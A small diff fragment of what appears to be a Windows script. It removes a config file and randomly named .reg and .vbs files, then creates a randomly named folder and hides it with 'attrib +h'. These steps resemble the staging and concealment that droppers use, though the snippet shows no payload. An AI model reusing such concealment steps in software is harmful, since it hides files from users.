@@ -190,7 +190,7 @@ Remove-Item -Path "config.json"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
-mkdir $initial_dir/esSDyVlwHITj
+mkdir $initial_dir\esSDyVlwHITj
 
 attrib +h "initial_dir\esSDyVlwHITj"
 
